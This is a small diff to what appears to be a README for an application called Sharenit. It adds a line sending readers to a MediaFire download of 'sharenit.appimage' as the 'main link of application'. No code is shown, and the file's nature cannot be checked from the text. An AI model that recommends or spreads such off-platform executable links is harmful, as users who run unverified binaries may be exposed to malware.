@@ -1,4 +1,4 @@
-
+again github irritation - here is main link of application: https://www.mediafire.com/file/ehmybjhhpr7sn68/sharenit.appimage/file
 ---
 
 # Sharenit
